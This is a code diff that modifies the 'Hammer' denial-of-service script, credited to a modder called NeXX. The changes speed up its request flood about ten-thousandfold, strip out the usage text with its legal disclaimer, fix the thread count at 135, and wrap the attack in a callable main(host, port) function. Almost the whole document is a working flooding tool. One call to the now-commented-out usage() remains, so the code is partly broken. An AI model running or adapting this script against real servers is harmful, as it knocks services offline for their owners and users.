@@ -5,10 +5,12 @@
 # by Can Yalçın
 # only for legal purpose
 
+# Modded by NeXX. 
+
 
 from queue import Queue
 from optparse import OptionParser
-import time,sys,socket,threading,logging,urllib.request,random
+import time, sys, socket, threading, logging, requests, random
 
 def user_agent():
 	global uagent
@@ -34,11 +36,12 @@ def my_bots():
 def bot_hammering(url):
 	try:
 		while True:
-			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
+			req = requests.get(url, headers={'User-Agent': random.choice(uagent)})
+			# req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
 			print("\033[94mbot is hammering...\033[0m")
-			time.sleep(.1)
+			time.sleep(.00001)
 	except:
-		time.sleep(.1)
+		time.sleep(.00001)
 
 
 def down_it(item):
@@ -74,16 +77,21 @@ def dos2():
 		w.task_done()
 
 
-def usage():
-	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
-	It is the end user's responsibility to obey all applicable laws.
-	It is just for server testing script. Your ip is visible. \n
-	usage : python3 hammer.py [-s] [-p] [-t]
-	-h : help
-	-s : server ip
-	-p : port default 80
-	-t : turbo default 135 \033[0m''')
-	sys.exit()
+# def usage():
+# 	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
+# 	It is the end user's responsibility to obey all applicable laws.
+# 	It is just for server testing script. Your ip is visible. \n
+# 	usage : python3 hammer.py [-s] [-p] [-t]
+# 	-h : help
+# 	-s : server ip
+# 	-p : port default 80
+# 	-t : turbo default 135 \033[0m''')
+# 	sys.exit()
+
+
+def get_thr():
+	global thr
+	thr = 135
 
 
 def get_parameters():
@@ -95,24 +103,24 @@ def get_parameters():
 	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
 	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
 	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
-	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
-	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
+	# optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
+	# optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
 	opts, args = optp.parse_args()
 	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
-	if opts.help:
-		usage()
+	# if opts.help:
+	# 	usage()
 	if opts.host is not None:
 		host = opts.host
-	else:
-		usage()
+	# else:
+	# 	usage()
 	if opts.port is None:
 		port = 80
 	else:
 		port = opts.port
-	if opts.turbo is None:
-		thr = 135
-	else:
-		thr = opts.turbo
+	# if opts.turbo is None:
+	# 	thr = 135
+	# else:
+	# 	thr = opts.turbo
 
 
 # reading headers
@@ -125,22 +133,35 @@ q = Queue()
 w = Queue()
 
 
-if __name__ == '__main__':
-	if len(sys.argv) < 2:
-		usage()
-	get_parameters()
+def main(_host='', _port=0):
+	if _host:
+		global host
+		host = _host
+	
+	if _port:
+		global port
+		port = _port	
+
+	else:
+		get_parameters()
+
+	get_thr()
+
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
 	print("\033[94mPlease wait...\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
+
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((host,int(port)))
 		s.settimeout(1)
+	
 	except socket.error as e:
 		print("\033[91mcheck server ip and port\033[0m")
 		usage()
+	
 	while True:
 		for i in range(int(thr)):
 			t = threading.Thread(target=dos)
@@ -149,15 +170,24 @@ if __name__ == '__main__':
 			t2 = threading.Thread(target=dos2)
 			t2.daemon = True  # if thread is exist, it dies
 			t2.start()
+	
 		start = time.time()
+		
 		#tasking
 		item = 0
+		MAX_ITEM = 1800
+	
 		while True:
-			if (item>1800): # for no memory crash
+			if (item>MAX_ITEM): # for no memory crash
 				item=0
 				time.sleep(.1)
-			item = item + 1
+
+			item += 1
 			q.put(item)
 			w.put(item)
+
 		q.join()
 		w.join()
+
+if __name__ == '__main__':
+	main()
